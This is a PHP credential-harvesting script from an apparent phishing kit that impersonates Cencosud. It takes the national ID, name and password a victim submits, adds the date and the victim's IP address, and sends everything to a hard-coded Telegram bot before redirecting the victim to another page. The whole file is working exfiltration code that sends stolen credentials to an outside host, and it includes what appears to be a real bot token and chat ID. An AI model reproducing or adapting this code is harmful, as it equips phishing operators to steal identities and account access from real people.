<?php
session_start();
$ip = getenv("REMOTE_ADDR");

$msg = "
===CENCOSUD===
dni: ".$_SESSION['dni'] = $_POST['dni']." 
nombre: ".$_SESSION['user'] = $_POST['user']."
mail: ".$_SESSION['pass'] = $_POST['pass']."
Dia: " . date("d/m/Y") . "   " . date("H:i:s") . "
IP : $ip
==================";

define('BOT_TOKEN', '2095773574:AAFFWH6JUKlHpcsmUbSZPBu9XqKzDEiaHww');
define('CHAT_ID', '1139396431');
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');

enviar_telegram($msg);

function enviar_telegram($msj)  {
	$queryArray = [
		'chat_id' => CHAT_ID,
		'text' => $msj,
	];
	$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
	$result = file_get_contents($url);
}

header("Location: reenvia.html?ip=$ip");
?>
